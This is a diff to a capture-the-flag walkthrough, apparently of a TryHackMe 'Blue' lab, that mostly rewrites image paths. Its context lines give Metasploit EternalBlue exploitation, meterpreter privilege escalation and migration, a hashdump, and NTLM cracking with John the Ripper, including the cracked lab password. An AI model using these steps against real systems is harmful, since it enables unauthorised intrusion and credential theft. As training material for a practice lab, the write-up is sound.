@@ -45,13 +45,13 @@ Set your local IP address as LHOST and LPORT to a random port that is not alread
 `set LPORT 4444`
 Search Metasploit's database for the EternalBlue exploit: `search ms17-010`
 
-![ms17-010](\images\blue\ms17-010.png)
+![ms17-010]({{ site.baseurl }}/assets/images/thm/blue/ms17-010.png)
 
 Use the exploit: `use exploit/windows/smb/ms17_010_eternalblue`
 
 Show the options for the exploit: `show options`. You'll get "RHOSTS" as the first result.
 
-![options](\\images\blue\options.png)
+![options]({{ site.baseurl }}/assets/images/thm/blue/options.png)
 
 Now set RHOSTS as the target machine's IP address: `set RHOSTS` [target_IP]
 
@@ -67,30 +67,30 @@ Let's now search the Metasploit database for info on how to convert a shell to a
 
 This way we will get the answer: `post/multi/manage/shell_to_meterpreter`.
 
-![shell](\images\blue\shell.png)
+![shell]({{ site.baseurl }}/assets/images/thm/blue/shell.png)
 
 Use this post module with use 0 and show its' options with show options.
 
-![session](\images\blue\session.png)
+![session]({{ site.baseurl }}/assets/images/thm/blue/session.png)
 
 Since we have two sessions going on, we will have to change the SESSION option to 1 with `set SESSION 1`. To know to which session you have to switch, use the command `sessions -l`.
 
-![sessions](\images\blue\sessions.png)
+![sessions]({{ site.baseurl }}/assets/images/thm/blue/sessions.png)
 
 Now run the exploit with `run`.
 Once we get the [*] Stopping exploit/multi/handler message, press Ctrl+c to stop that payload and select the session you just created with `sessions -i 2` or whatever number your session is (look for it with `sessions -l`).
 
-![session2](\images\blue\session2.png)
+![session2]({{ site.baseurl }}/assets/images/thm/blue/session2.png)
 
-![meterpreter](\images\blue\meterpreter.png)
+![meterpreter]({{ site.baseurl }}/assets/images/thm/blue/meterpreter.png)
 
 The getsystem command will now return this:
 
-![system](\images\blue\system.png)
+![system]({{ site.baseurl }}/assets/images/thm/blue/ports.png)
 
 You can also list all the processes with the ps command and you can migrate to one of these.
 
-![ps](\images\blue\ps.png)
+![ps]({{ site.baseurl }}/assets/images/thm/blue/ps.png)
 
 Find a process that runs at NT AUTHORITY\SYSTEM and copy its' PID.
 Now migrate to it with `migrate [PID]` (e.g., `migrate 2868`).
@@ -98,7 +98,7 @@ Now migrate to it with `migrate [PID]` (e.g., `migrate 2868`).
 ## Cracking
 Now use the `hashdump` command.
 
-![hashdump](\images\blue\hashdump.png)
+![hashdump]({{ site.baseurl }}/assets/images/thm/blue/hashdump.png)
 
 Jon is the non-default user. Copy the NTLM digest.
 Then we'll copy the digest to a file with:
@@ -108,7 +108,7 @@ We'll run John The Ripper on the file with:
 `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
 
 This will return alqfna22 as the password.
-![john](\images\blue\john.png)
+![john]({{ site.baseurl }}/assets/images/thm/blue/john.png)
 
 ## Find flags!
 The first flag is located in the C:\ folder:
